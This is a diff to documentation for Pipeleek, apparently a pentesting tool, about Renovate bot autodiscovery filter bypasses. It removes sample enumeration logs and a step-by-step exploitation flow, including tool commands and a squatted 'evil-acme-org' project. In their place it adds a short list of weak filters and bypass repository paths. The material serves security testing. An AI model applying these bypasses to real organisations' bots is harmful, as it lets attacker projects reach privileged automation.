@@ -48,37 +48,12 @@ Even when autodiscovery filters are enabled, weak or poorly written filter regex
 
 Pipeleek reports filter analysis on the main enum log line through `autodiscoveryFilterBypass`.
 The field is only emitted when a vulnerable finding is detected and contains the matching vulnerable rule ID (for example: `V1`, `V2`, `V3`, `V4`).
-Examples of vulnerable filter summaries:
+Quick examples (filter value -> example bypass path):
 
-```bash
-# V1: only-negation filter list
-2025-09-30T07:48:28Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="[\"!/acme-org/private/.*\"]" autodiscoveryFilterBypass=V1 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
-
-# V2: wildcard allows everything
-2025-09-30T07:48:29Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="*" autodiscoveryFilterBypass=V2 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
-
-# V3: unanchored regex
-2025-09-30T07:48:30Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="/acme-org\/infra/" autodiscoveryFilterBypass=V3 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
-
-# V4: anchored regex still bypassable by sibling namespace squatting
-2025-09-30T07:48:31Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="/^acme-org/" autodiscoveryFilterBypass=V4 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
-```
-
-Example exploitation flow (V3):
-
-```bash
-# 1) Find a target where Pipeleek reports a vulnerable autodiscovery filter.
-pipeleek gl renovate enum -u https://gitlab.com -t glpat-[redacted]
-2025-09-30T07:48:30Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="/acme-org\/infra/" autodiscoveryFilterBypass=V3 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
-
-# 2) Create an attacker-controlled repository path that matches the weak filter.
-#    For this example, a squatted namespace like "evil-acme-org/infra-test" can pass V3-style filters.
-
-# 3) Trigger the exploit scaffold and wait for the bot to process your project.
-pipeleek gl renovate autodiscovery -u https://gitlab.com -t glpat-[redacted] -v
-2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/evil-acme-org/infra-test
-2025-09-30T07:19:37Z info Then wait until the created project is renovated by the invited Renovate Bot user
-```
+- `V1`: `["!/acme-org/private/.*"]` -> `attacker/any-repo`
+- `V2`: `*` -> `attacker/any-repo`
+- `V3`: `/acme-org\/infra/` -> `evil-acme-org/infra-test`
+- `V4`: `/^acme-org/` -> `acme-org-evil/x`
 
 ## 2. Exploit Autodiscovery with a Malicious Project
 
